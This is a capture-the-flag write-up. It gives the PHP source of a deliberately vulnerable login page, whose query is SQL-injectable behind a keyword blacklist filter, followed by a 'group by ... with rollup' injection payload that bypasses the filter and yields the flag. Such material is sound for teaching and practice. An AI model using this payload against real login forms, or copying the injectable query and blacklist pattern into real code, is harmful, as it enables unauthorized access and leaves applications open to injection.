# Challenge 
```php 
<?php
error_reporting(0);
if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
	echo '<form action="" method="post">'."<br/>";
	echo '<input name="uname" type="text"/>'."<br/>";
	echo '<input name="pwd" type="text"/>'."<br/>";
	echo '<input type="submit" />'."<br/>";
	echo '</form>'."<br/>";
	echo '<!--source: source.txt-->'."<br/>";
    die;
}
function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   
        print "水可载舟，亦可赛艇！";
        exit();
    }
}
$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){
    AttackFilter($key,$value,$filter);
}
$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
	die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql);
if (mysql_num_rows($query) == 1) {
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
	print "一颗赛艇！";
}
mysql_close($con);
?>
```
# Solution
payload:
```
uname='  or 1=1 group by pwd with rollup limit 1 offset 2 #&pwd=
```

# Refference
+ [chybeta : 因缺思汀的绕过](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#%E5%9B%A0%E7%BC%BA%E6%80%9D%E6%B1%80%E7%9A%84%E7%BB%95%E8%BF%87)